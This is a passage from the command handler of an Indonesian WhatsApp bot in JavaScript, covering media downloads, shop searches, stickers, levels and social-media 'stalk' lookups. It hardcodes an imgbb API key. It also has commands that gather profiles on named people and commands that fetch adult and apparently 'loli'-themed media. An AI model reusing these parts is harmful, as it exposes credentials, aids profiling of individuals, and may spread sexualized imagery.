                            if (!isRegister) return reply(`You are not verified\n\nReply this chat and send bot password\n\nHint : \nPassword contains 4 digit number\nCheck password at: https://dha-chan02.github.io`)
                            let wipu = (await axios.get(`https://raw.githubusercontent.com/Arya-was/endak-tau/main/${command}.json`)).data
                            let wipi = wipu[Math.floor(Math.random() * (wipu.length))]
                            fs.writeFileSync(`./${sender}.jpeg`, await getBuffer(wipi))
                            buttons = [{
                                   buttonId: `${prefix + command}`,
                                   buttonText: {
                                          displayText: `➡️Next`
                                   },
                                   type: 1
                            }, {
                                   buttonId: `${prefix}nhentaibot`,
                                   buttonText: {
                                          displayText: 'NHENTAI BOT'
                                   },
                                   type: 1
                            }]
                            imageMsg = (await dha.prepareMessage(from, fs.readFileSync(`./${sender}.jpeg`), 'imageMessage', {
                                   thumbnail: Buffer.alloc(0)
                            })).message.imageMessage
                            buttonsMessage = {
                                   footerText: 'Jangan Lupa Donasi Ya Kak ☕',
                                   imageMessage: imageMsg,
                                   contentText: `klik Next untuk ke gambar selanjut nya`,
                                   buttons,
                                   headerType: 4
                            }
                            prep = await dha.prepareMessageFromContent(from, {
                                   buttonsMessage
                            }, {
                                   quoted: mek
                            })
                            dha.relayWAMessage(prep)
                            fs.unlinkSync(`./${sender}.jpeg`)
                            break
                     case 'playy':
                     case 'lagu':
                            if (args.length < 1) return reply('Apa Yang Mau Dicari?')
                            teks = args.join(' ')
                            reply(mess.wait)
                            if (!teks.endsWith("-doc")) {
                                   res = await yts(`${teks}`).catch(e => {
                                          reply('_[ ! ] Error Query Yang Anda Masukan Tidak Ada_')
                                   })
                                   reply(` Playing ${res.all[0].title}`)
                                   let thumbInfo = ` *Youtube Search*
 *Judul :* ${res.all[0].title}
 *ID Video :* ${res.all[0].videoId}
 *Diupload Pada :* ${res.all[0].ago}
 *Views :* ${res.all[0].views}
 *Durasi :* ${res.all[0].timestamp}
 *Channel :* ${res.all[0].author.name}
*Link Channel :* ${res.all[0].author.url}

*_Tunggu Proses Upload....._*
`
                                   /////////////sendFileFromUrl(res.all[0].image, image, {quoted: mek, caption: thumbInfo})
                                   res = await y2mateA(res.all[0].url).catch(e => {
                                          reply('_[ ! ] Error Saat Memasuki Web Y2mate_')
                                   })
                                   sendFileFromUrl(res[0].link, audio, {
                                          quoted: mek,
                                          mimetype: 'audio/mp4',
                                          filename: res[0].output
                                   })
                            }
                            if (teks.endsWith("-doc")) {
                                   const tec = teks.split("-doc")
                                   res = await yts(`${tec}`).catch(e => {
                                          reply('_[ ! ] Error Query Yang Anda Masukan Tidak Ada_')
                                   })
                                   reply(`.Playing ${res.all[0].title}`)
                                   let thumbInfo = `*${botname}* 
 *Judul :* ${res.all[0].title}
 *ID Video :* ${res.all[0].videoId}
 *Diupload Pada :* ${res.all[0].ago}
 *Views :* ${res.all[0].views}
 *Durasi :* ${res.all[0].timestamp}
 *Channel :* ${res.all[0].author.name}
*Link Channel :* ${res.all[0].author.url}

*_Tunggu Proses Upload....._*
`
                                   sendFileFromUrl(res.all[0].image, image, {
                                          quoted: mek,
                                          caption: thumbInfo
                                   })
                                   res = await y2mateA(res.all[0].url).catch(e => {
                                          reply('_[ ! ] Error Saat Memasuki Web Y2mate_')
                                   })
                                   sendFileFromUrl(res[0].link, document, {
                                          quoted: mek,
                                          mimetype: 'audio/mp3',
                                          filename: res[0].output
                                   })
                            }
                            break
                     case 'play2':
                            if (args.length < 1) return reply('*Masukan judul nya?*')
                            reply('Loading.... ')
                            play = args.join(" ")
                            anu = await fetchJson(`https://api.zeks.xyz/api/ytplaymp4?q=${play}&apikey=${setting.zekskey}`)
                            if (anu.error) return reply(anu.error)
                            infomp3 = `*「 PLAY VIDEO 」*
				
Judul : ${anu.result.title}
Source : ${anu.result.source}
				
*[Wait] Tunggu Sebentar..*`
                            ///////buffer = await getBuffer(anu.result.thumbnail)
                            buffer1 = await getBuffer(anu.result.url_video)
                            dha.sendMessage(from, buffer1, video, {
                                   mimetype: 'video/mp4',
                                   filename: `${anu.result.video}.mp4`,
                                   quoted: freply,
                                   caption: 'Nih Gan'
                            })
                            break
                     case 'play':
                            if (!q) return reply('Linknya?')
                            buttons = [{
                                   buttonId: `${prefix}play2 ${q}`,
                                   buttonText: {
                                          displayText: `🎥 Video`
                                   },
                                   type: 1
                            }, {
                                   buttonId: `${prefix}playy ${q}`,
                                   buttonText: {
                                          displayText: '🎵 Mp3'
                                   },
                                   type: 1
                            }]
                            imageMsg = (await dha.prepareMessageMedia(fs.readFileSync(`./media/diablo.png`), 'imageMessage', {
                                   thumbnail: fs.readFileSync(`./media/diablo.png`)
                            })).imageMessage
                            buttonsMessage = {
                                   footerText: 'Jangan Lupa Donasi Ya Kak ☕',
                                   imageMessage: imageMsg,
                                   contentText: `Silahkan Pilih Media Yg Akan Di Download kak`,
                                   buttons,
                                   headerType: 4
                            }
                            prep = await dha.prepareMessageFromContent(from, {
                                   buttonsMessage
                            }, {
                                   quoted: mek
                            })
                            dha.relayWAMessage(prep)
                            break
                     case 'lirik':
                            if (!q) return reply(mess.wrongFormat)
                            reply(mess.wait)
                            lirikLagu(q).then((res) => {
                                   let lirik = `Lirik Lagu ${q}

               ${res[0].result}
`
                                   reply(lirik)
                            })
                            break
                     case 'pinterest':
                            if (args.length == 0) return reply(`Example: ${prefix + command} loli kawaii`)
                            query = args.join(" ")
                            ini_url = await fetchJson(`https://api.lolhuman.xyz/api/pinterest?apikey=${setting.lolkey}&query=${query}`)
                            ini_url = ini_url.result
                            ini_buffer = await getBuffer(ini_url)
                            await dha.sendMessage(from, ini_buffer, image, {
                                   quoted: mek
                            })
                            break
                     case 'shopee':
                            try {
                                   if (args.length == 0) return reply(`Kirim perintah *${prefix}shopee [ query ]*\nContoh : ${prefix}shopee sepatu`)
                                   query = args.join(" ")
                                   reply(mess.wait)
                                   get_data = await fetchJson(`https://api.zeks.xyz/api/shopee?apikey=${setting.zekskey}&q=${query}`)
                                   get_data = get_data.data
                                   teks = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *SHOPEE*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*\n`
                                   for (let i = 0; i < get_data.length; i++) {
                                          teks += `\`\`\`▢ Nama : ${get_data[i].name}\`\`\`
\`\`\`▢ Harga : ${get_data[i].harga}\`\`\`
\`\`\`▢ Terjual : ${get_data[i].terjual}\`\`\`
\`\`\`▢ Lokasi : ${get_data[i].location}\`\`\`
\`\`\`▢ Deskripsi*: ${get_data[i].desc}\`\`\`
\`\`\`▢ Stok : ${get_data[i].stock}\`\`\`
\`\`\`▢ Informasi : ${get_data[i].information}\`\`\`
\`\`\`▢ Link : ${get_data[i].url}\`\`\``
                                   }
                                   ini_buffer = await getBuffer(get_data[0].img_detail[0])
                                   dha.sendMessage(from, ini_buffer, image, {
                                          quoted: mek,
                                          caption: teks
                                   })
                            } catch {
                                   reply(`Maaf produk ${query} tidak ditemukan`)
                            }
                            break
                     case 'playstore':
                            try {
                                   if (args.length == 0) return reply(`Kirim perintah *${prefix}playstore [ apk ]*\nContoh : ${prefix}playstore pubg`)
                                   query = args.join(" ")
                                   reply(mess.wait)
                                   get_result = await fetchJson(`https://api.zeks.xyz/api/sgplay?apikey=${setting.zekskey}&q=${query}`)
                                   get_result = get_result.result
                                   teks = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *PLAYSTORE*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*\n`
                                   for (let i = 0; i < get_result.length; i++) {
                                          teks += `\`\`\`▢ Title : ${get_result[i].title}\`\`\`
\`\`\`▢ Harga : ${get_result[i].price}\`\`\`
\`\`\`▢ Rate : ${get_result[i].rating}\`\`\`
\`\`\`▢ Link : ${get_result[i].url}\`\`\`

`
                                   }
                                   ini_buffer = await getBuffer(get_result[0].thumb)
                                   dha.sendMessage(from, ini_buffer, image, {
                                          quoted: mek,
                                          caption: teks
                                   })
                            } catch {
                                   reply(`Maaf aplikasi ${query} tidak ditemukan`)
                            }
                            break
                     case 'yts':
                     case 'ytsearch':
                            if (!q) return reply(mess.wrongFormat)
                            reply(mess.wait)
                            try {
                                   res = await yts(q)
                                   a = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *YOUTUBE SEARCH*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*\n`
                                   for (let i of res.all) {
                                          a += `\`\`\`▢ Title : ${i.title}\`\`\`
\`\`\`▢ Views : ${i.views}\`\`\`
\`\`\`▢ Upload : ${i.ago}\`\`\`
\`\`\`▢ Durasi : ${i.timestamp}\`\`\`
\`\`\`▢ Channel : ${i.author.name}\`\`\`
\`\`\`▢ Link : ${i.url}\`\`\``
                                   }
                                   b = a.trim()
                                   sendFileFromUrl(res.all[0].image, image, {
                                          quoted: mek,
                                          caption: b
                                   })
                            } catch (e) {
                                   console.log(e)
                                   reply(`${e}`)
                            }
                            break
                     case 'tourl':
                            if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedVideo) && args.length == 0) {
                                   reply(mess.wait)
                                   boij = isQuotedImage || isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                                   owgi = await dha.downloadMediaMessage(boij)
                                   res = await uploadImages(owgi)
                                   reply(res)
                            } else {
                                   reply('kirim/reply gambar/video')
                            }
                            break
                     case 'imgtourl':
                     case 'img2url':
                            reply(mess.wait)
                            var imgbb = require('imgbb-uploader')
                            var encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                            var media = await dha.downloadAndSaveMediaMessage(encmedia)
                            imgbb('39d895963468b814fad0514bd28787e2', media)
                                   .then(data => {
                                          var caps = `*_IMAGE TO URL_*\n\n*~>  ID :* ${data.id}\n*~>  MimeType :* ${data.image.mime}\n*~>  Extension :* ${data.image.extension}\n*~>  URL :* ${data.display_url}`
                                          ibb = fs.readFileSync(media)
                                          dha.sendMessage(from, ibb, image, {
                                                 quoted: mek,
                                                 caption: caps
                                          })
                                   })
                                   .catch(err => {
                                          throw err
                                   })
                            break
                     case 'asupan': // shansekai                
                            if (!isPremium) return reply(mess.only.premium)
                            reply(mess.wait)
                            asupan()
                                   .then(async (body) => {
                                          asupann = body.split('\n')
                                          asupanx = asupann[Math.floor(Math.random() * asupann.length)]
                                          sendMediaURL(from, `http://sansekai.my.id/ptl_repost/${asupanx}`, '\`\`\`ASUPAN BRO GUA DAPAT DARI LORD ©hzkyx\`\`\`')
                                          console.log('Success sending video!')
                                   })
                                   .catch(async (err) => {
                                          console.log(err)
                                          reply(`${err}`)
                                   })
                            break
                     case 'nulis':
                     case 'tulis':
                            if (args.length < 1) return reply('Yang mau di tulis apaan?')
                            teks = args.join(' ')
                            reply(mess.wait)
                            nulis = encodeURIComponent(teks)
                            res = await axios.get(`https://dt-04.herokuapp.com/nulis?text=${nulis}`)
                            if (res.data.error) return reply(res.data.error)
                            buff = Buffer.from(res.data.result.split(',')[1], 'base64')
                            dha.sendMessage(from, buff, image, {
                                   quoted: mek,
                                   caption: mess.success
                            }).catch(e => {
                                   return reply('_[ ! ] Error Gagal Dalam Mendownload Dan Mengirim File_')
                            })
                            break
                            //------------------< Level >-------------------
                     case 'level':
                            if (!isGroup) return reply(mess.only.group)
                            if (!isLevelingOn) return await reply('Fitur leveling belum diaktifkan!')
                            let userLevel = level.getLevelingLevel(sender, _level)
                            let userXp = level.getLevelingXp(sender, _level)
                            let requiredXp = 10 * Math.pow(userLevel, 2) + 50 * userLevel + 100
                            let userRank = level.getUserRank(sender, _level)
                            try {
                                   profilePic = await dha.getProfilePicture(sender)
                            } catch {
                                   profilePic = errorImg
                            }
                            buffer = await getBuffer(`https://lolhuman.herokuapp.com/api/rank?apikey=${setting.lolkey}&img=${profilePic}&background=https://telegra.ph/file/443b6600636aed1d94acd.jpg&username=${encodeURI(pushname)}&level=${userLevel}&ranking=${Number(userRank)}&currxp=${userXp}&xpneed=${requiredXp}`)
                            teks = `*「 LEVEL 」*\n\n➸ *Nama :* ${pushname}\n➸ *Xp :* ${userXp} / ${requiredXp}\n➸ *Level :* ${userLevel}\n➸ *Role*: *${role}*\n\n*Note : Kumpulin Xp Jika Ingin Menaikkan Level*`
                            dha.sendMessage(from, buffer, image, {
                                   caption: teks,
                                   quoted: mek
                            })
                            break
                     case 'leaderboard': //Cek Leaderboard
                     case 'leaderboards':
                            if (!isGroup) return reply(mess.only.group)
                            if (!isLevelingOn) return await reply('Fitur leveling belum diaktifkan!')
                            const resp = _level
                            _level.sort((a, b) => (a.xp < b.xp) ? 1 : -1)
                            let leaderboard = '-----[ *LEADERBOARD* ]----\n\n'
                            try {
                                   for (let i = 0; i < 10; i++) {
                                          var roles = 'Warrior III'
                                          if (resp[i].level <= 5) {
                                                 roles = 'Warrior II'
                                          } else if (resp[i].level <= 10) {
                                                 roles = 'Warrior I'
                                          } else if (resp[i].level <= 15) {
                                                 roles = 'Elite III'
                                          } else if (resp[i].level <= 20) {
                                                 roles = 'Elite II'
                                          } else if (resp[i].level <= 25) {
                                                 roles = 'Elite I'
                                          } else if (resp[i].level <= 30) {
                                                 roles = 'Master III'
                                          } else if (resp[i].level <= 35) {
                                                 roles = 'Master II'
                                          } else if (resp[i].level <= 40) {
                                                 roles = 'Master I'
                                          } else if (resp[i].level <= 45) {
                                                 roles = 'GrandMaster III'
                                          } else if (resp[i].level <= 50) {
                                                 roles = 'GrandMaster II'
                                          } else if (resp[i].level <= 55) {
                                                 roles = 'GrandMaster I'
                                          } else if (resp[i].level <= 60) {
                                                 roles = 'Epic III'
                                          } else if (resp[i].level <= 65) {
                                                 roles = 'Epic II'
                                          } else if (resp[i].level <= 70) {
                                                 roles = 'Epic I'
                                          } else if (resp[i].level <= 75) {
                                                 roles = 'Legend III'
                                          } else if (resp[i].level <= 80) {
                                                 roles = 'Legend II'
                                          } else if (resp[i].level <= 85) {
                                                 roles = 'Legend I'
                                          } else if (resp[i].level <= 90) {
                                                 roles = 'Mythic'
                                          } else if (resp[i].level <= 95) {
                                                 roles = 'Mythical Glory'
                                          } else if (resp[i].level >= 100) {
                                                 roles = 'Immortal'
                                          }

                                          leaderboard += `➸ ${i + 1}. wa.me/${_level[i].id.replace('@s.whatsapp.net', '')}\n➸ *Xp :* ${_level[i].xp}\n➸ *Level :* ${_level[i].level}\n➸ *Role :* ${roles}\n\n`
                                   }
                                   reply(leaderboard)
                            } catch (err) {
                                   console.error(err)
                                   reply('_Perlu setidaknya 10 user yang memiliki level di database!_')
                            }
                            break
                            //------------------< Stalk >-------------------
                     case 'stalkgithub':
                     case 'githubstalk':
                            if (args.length == 0) return reply(`Example: ${prefix + command} dha-chan02`)
                            reply(mess.wait)
                            username = args[0]
                            ini_result = await fetchJson(`https://api.lolhuman.xyz/api/github/${username}?apikey=${setting.lolkey}`)
                            ini_result = ini_result.result
                            ini_buffer = await getBuffer(ini_result.avatar)
                            ini_txt = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *GITHUB USER*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`▢ Username : ${ini_result.name}\`\`\`
\`\`\`▢ Public Repo : ${ini_result.public_repos}\`\`\`
\`\`\`▢ Public Gists : ${ini_result.public_gists}\`\`\`
\`\`\`▢ Pengikut : ${ini_result.followers}\`\`\`
\`\`\`▢ Following : ${ini_result.following}\`\`\`
\`\`\`▢ Mengikuti : ${ini_result.bio}\`\`\`
\`\`\`▢ Link : ${ini_result.url}\`\`\`
`
                            dha.sendMessage(from, ini_buffer, image, {
                                   caption: ini_txt,
                                   thumbnail: Buffer.alloc(0)
                            })
                            break
                     case 'stalkig':
                     case 'igstalk':
                            if (args.length == 0) return reply(`Example: ${prefix + command} dha.chan26`)
                            reply(mess.wait)
                            username = args[0]
                            ini_result = await fetchJson(`https://api.lolhuman.xyz/api/stalkig/${username}?apikey=${setting.lolkey}`)
                            ini_result = ini_result.result
                            ini_buffer = await getBuffer(ini_result.photo_profile)
                            ini_txt = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *INSTAGRAM PROFILE*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`▢ Username : ${ini_result.username}\`\`\`
\`\`\`▢ Nama : ${ini_result.fullname}\`\`\`
\`\`\`▢ Pengikut : ${ini_result.followers}\`\`\`
\`\`\`▢ Mengikuti : ${ini_result.following}\`\`\`
\`\`\`▢ Deskripsi : ${ini_result.bio}\`\`\`
\`\`\`▢ Link : https://instagram.com/${ini_result.username}\`\`\`
`
                            dha.sendMessage(from, ini_buffer, image, {
                                   caption: ini_txt,
                                   thumbnail: Buffer.alloc(0)
                            })
                            break
                     case 'stalktiktok':
                     case 'tiktokstalk':
                            if (args.length == 0) return reply(`Example: ${prefix + command} marz.hiatus`)
                            reply(mess.wait)
                            stalk_toktok = args[0]
                            get_result = await fetchJson(`http://lolhuman.herokuapp.com/api/stalktiktok/${stalk_toktok}?apikey=${setting.lolkey}`)
                            get_result = get_result.result
                            pp_tt = await getBuffer(get_result.user_picture)
                            ini_txt = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *TIKTOK PROFILE*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`▢ Username : ${get_result.username}\`\`\`
\`\`\`▢ Nama : ${get_result.nickname}\`\`\`
\`\`\`▢ Pengikut : ${get_result.followers}\`\`\`
\`\`\`▢ Mengikuti : ${get_result.followings}\`\`\`
\`\`\`▢ Likes : ${get_result.likes}\`\`\`
\`\`\`▢ Video : ${get_result.video}\`\`\`
\`\`\`▢ Deskripsi : ${get_result.bio}\`\`\`
`
                            dha.sendMessage(from, pp_tt, image, {
                                   quoted: mek,
                                   caption: ini_txt,
                                   thumbnail: Buffer.alloc(0)
                            })
                            break
                     case 'iguser':
                            try {
                                   if (args.length == 0) return reply(`Kirim perintah *${prefix}iguser [ username ]*\nContoh : ${prefix}iguser jessnolimit`)
                                   query = args.join(" ")
                                   reply(mess.wait)
                                   get_result = await fetchJson(`https://api.zeks.xyz/api/iguser?apikey=${setting.zekskey}&q=${query}`)
                                   get_result = get_result.result
                                   teks = `*「 INSTAGRAM USER 」*\n\n*Hasil Pencarian : ${query}*\n\n`
                                   for (let i = 0; i < get_result.length; i++) {
                                          teks += `*Username* : ${get_result[i].username}\n*Full name*: ${get_result[i].full_name}\n*Akun private* : ${get_result[i].private_user}\n*Verified*: ${get_result[i].verified_user}\n*Link*: https://instagram.com/${get_result[i].username}\n\n`
                                   }
                                   ini_buffer = await getBuffer(get_result[0].profile_pic)
                                   dha.sendMessage(from, ini_buffer, image, {
                                          quoted: mek,
                                          caption: teks
                                   })
                            } catch {
                                   reply(`Maaf username ${query} tidak ditemukan`)
                            }
                            break

                     case 'ffstalk':
                            if (args.length == 0) return reply(`Idnya mana kak?`)
                            ff_id = args[0]
                            get_result = await fetchJson(`https://lolhuman.herokuapp.com/api/freefire/${ff_id}?apikey=genbotkey`)
                            reply(`nih kak`)
                            break
                            //------------------< Sticker/Tools >-------------------

                     case 'dadu': // by CHIKAA CHANTEKKXXZZ
                            reply(mess.wait)
                            dadu()
                                   .then(async (body) => {
                                          dadugerak = body.split('\n')
                                          dadugerakx = dadugerak[Math.floor(Math.random() * dadugerak.length)]
                                          sendWebp(from, dadugerakx)
                                   })
                                   .catch(async (err) => {
                                          console.error(err)
                                          reply('Error!')
                                   })
                            break
                     case 'doge':
                            reply(mess.wait)
                            fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/anjing')
                                   .then(res => res.text())
                                   .then(body => {
                                          let tod = body.split("\n");
                                          let pjr = tod[Math.floor(Math.random() * tod.length)];
                                          sendWebp(from, pjr)
                                   })
                            break
                     case 'patrick':
                            reply(mess.wait)
                            fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/patrik')
                                   .then(res => res.text())
                                   .then(body => {
                                          let tod = body.split("\n");
                                          let pjr = tod[Math.floor(Math.random() * tod.length)];
                                          sendWebp(from, pjr)
                                   })
                            break
                     case 'gura':
                     case 'gawrgura':
                            reply(mess.wait)
                            fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/gura')
                                   .then(res => res.text())
                                   .then(body => {
                                          let tod = body.split("\n");
                                          let pjr = tod[Math.floor(Math.random() * tod.length)];
                                          sendWebp(from, pjr)
                                   })
                            break
                     case 'animestick':
                     case 'stickeranime':
                            reply(mess.wait)
                            fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/animestick')
                                   .then(res => res.text())
                                   .then(body => {
                                          let todd = body.split("\n");
                                          let pjrr = todd[Math.floor(Math.random() * todd.length)];
                                          sendWebp(from, pjrr)
                                   })
                            break
                     case 'telesticker':
                     case 'telestiker':
                            if (!q) return reply(`Example: ${prefix + command} https://t.me/addstickers/LINE_Menhera_chan_ENG`)
                            reply(mess.wait)
                            ini_url = await fetchJson(`https://api.lolhuman.xyz/api/telestick?apikey=${setting.lolkey}&url=${args[0]}`)
                            ini_sticker = ini_url.result.sticker
                            reply('Sending ' + ini_sticker.length + ' stickers...')
                            for (sticker_ in ini_sticker) {
                                   ini_buffer = await getBuffer(ini_sticker[sticker_])
                                   dha.sendMessage(from, ini_buffer, sticker, {})
                            }
                            break
                     case 'semoji':
                     case 'emoji':
                            if (args.length == 0) return reply(`Example: ${prefix + command} ðŸ˜­`)
                            emoji = args[0]
                            try {
                                   emoji = encodeURI(emoji[0])
                            } catch {
                                   emoji = encodeURI(emoji)
                            }
                            ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/smoji/${emoji}?apikey=${setting.lolkey}`)
                            await dha.sendMessage(from, ini_buffer, sticker, {
                                   quoted: mek
                            })
                            break
                     case 'ttp':
                            if (args.length < 1) return reply(`teksnya mana bruh?\ncontoh ${prefix} ${pushname}`)
                            woy = args.join(" ")
                            reply('wait....')
                            anjay = `http://zekais-api.herokuapp.com/text2png?text=${woy}&color=white`
                            sendStickerUrl(from, anjay)
                            break
                     case 'attp':
                            if (args.length == 0) return reply(`Example: ${prefix + command} yudha`)
                            buffer = await getBuffer(`https://api.xteam.xyz/attp?file&text=${encodeURI(q)}`)
                            dha.sendMessage(from, buffer, sticker, {
                                   quoted: mek
                            })
                            break
                     case 'ttg':
                            if (!q) return await reply(mess.wrongFormat)
                            reply(mess.wait)
                            sendWebp(from, `https://api.vhtear.com/textxgif?text=${q}&apikey=${setting.vhtearkey}`)
                                   .then(() => console.log('Success creating GIF!'))
                                   .catch(async (err) => {
                                          console.error(err)
                                          reply('Error!')
                                   })
                            break
                     case 'loliv':
                     case 'lolivid':
                     case 'lolivideo':
                            reply(mess.wait)
                            anu = await fetchText('https://raw.githubusercontent.com/AlvioAdjiJanuar/random/main/loli.txt')
                                   .then(async (body) => {
                                          anu = body.split('\n')
                                          anu = anu[Math.floor(Math.random() * anu.length)]
                                          sendMediaURL(from, anu)
                                   })
                                   .catch(async (err) => {
                                          console.error(err)
                                          reply(`${err}`)
                                   })
                            break
                     case 'gifstiker':
                     case 's':
                     case 'stickergif':
                     case 'sticker':
                     case 'stiker':
                            if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
                                   const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                                   const media = await dha.downloadAndSaveMediaMessage(encmedia)
                                   ran = '666.webp'
                                   await ffmpeg(`./${media}`)
                                          .input(media)
                                          .on('start', function (cmd) {
                                                 console.log(`Started : ${cmd}`)
                                          })
                                          .on('error', function (err) {
                                                 console.log(`Error : ${err}`)
                                                 fs.unlinkSync(media)
                                                 reply('error')
                                          })
                                          .on('end', function () {
                                                 console.log('Finish')
                                                 dha.sendMessage(from, fs.readFileSync(ran), sticker, {
                                                        quoted: mek
                                                 })
                                                 fs.unlinkSync(media)
                                                 fs.unlinkSync(ran)
                                          })
                                          .addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
                                          .toFormat('webp')
                                          .save(ran)
                            } else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
                                   const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                                   const media = await dha.downloadAndSaveMediaMessage(encmedia)
                                   ran = '999.webp'
                                   reply(mess.wait)
                                   await ffmpeg(`./${media}`)
                                          .inputFormat(media.split('.')[1])
                                          .on('start', function (cmd) {
                                                 console.log(`Started : ${cmd}`)
                                          })
                                          .on('error', function (err) {
                                                 console.log(`Error : ${err}`)
                                                 fs.unlinkSync(media)
                                                 tipe = media.endsWith('.mp4') ? 'video' : 'gif'
                                                 reply(`Gagal, pada saat mengkonversi ${tipe} ke stiker`)
                                          })
                                          .on('end', function () {
                                                 console.log('Finish')
                                                 dha.sendMessage(from, fs.readFileSync(ran), sticker, {
                                                        quoted: mek
                                                 })
                                                 fs.unlinkSync(media)
                                                 fs.unlinkSync(ran)
                                          })
                                          .addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
                                          .toFormat('webp')
                                          .save(ran)
                            } else {
                                   reply(`Kirim gambar dengan caption ${prefix}sticker\nDurasi Sticker Video 1-9 Detik`)
                            }
                            break
                     case 'take':
                     case 'colong':
                            if (!isQuotedSticker) return reply('Stiker aja om')
                            encmedia = JSON.parse(JSON.strngify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
                            media = await dha.downloadAndSaveMediaMessage(encmedia)
                            anu = args.join(' ').split('|')
                            satu = anu[0] !== '' ? anu[0] : `${pushname}`
                            dua = typeof anu[1] !== 'undefined' ? anu[1] : `UwU`
                            require('./lib/fetch.js').createExif(satu, dua)
                            require('./lib/fetch.js').modStick(media, dha, mek, from)
                            break
                     case 'delwm':
                            if (!isQuotedSticker) return reply('Stiker aja om')
                            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
                            media = await dha.downloadAndSaveMediaMessage(encmedia)
                            anu = args.join(' ').split('|')
                            satu = anu[0] !== '' ? anu[0] : ``
                            dua = typeof anu[1] !== 'undefined' ? anu[1] : ``
                            require('./lib/fetch.js').createExif(satu, dua)
                            require('./lib/fetch.js').modStick(media, dha, mek, from)
                            break
                     case 'stikerwm':
                     case 'stickerwm':
                     case 'swm':
                            var a = arg.split("|")[0];
                            var b = arg.split("|")[1];
                            if (isMedia && !mek.message.videoMessage || isQuotedImage) {
                                   const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                                   media = await dha.downloadAndSaveMediaMessage(encmedia)
                                   await createExif(a, b)
                                   out = getRandom('.webp')
                                   ffmpeg(media)
                                          .on('error', (e) => {
                                                 console.log(e)
                                                 dha.sendMessage(from, 'Terjadi kesalahan', 'conversation', {
                                                        quoted: mek
                                                 })
                                                 fs.unlinkSync(media)
                                          })
                                          .on('end', () => {
                                                 _out = getRandom('.webp')
                                                 spawn('webpmux', ['-set', 'exif', './sticker/data.exif', out, '-o', _out])
                                                        .on('exit', () => {
                                                               dha.sendMessage(from, fs.readFileSync(_out), 'stickerMessage', {
                                                                      quoted: mek
                                                               })
                                                               fs.unlinkSync(out)
                                                               fs.unlinkSync(_out)
                                                               fs.unlinkSync(media)
                                                        })
                                          })
                                          .addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
                                          .toFormat('webp')
                                          .save(out)
                            } else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
                                   const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                                   const media = await dha.downloadAndSaveMediaMessage(encmedia)
                                   pe = args.join('')
                                   var a = pe.split("|")[0];
                                   var b = pe.split("|")[1];
                                   await createExif(a, b)
                                   out = getRandom('.webp')
                                   ffmpeg(media)
                                          .on('error', (e) => {
                                                 console.log(e)
                                                 dha.sendMessage(from, 'Terjadi kesalahan', 'conversation', {
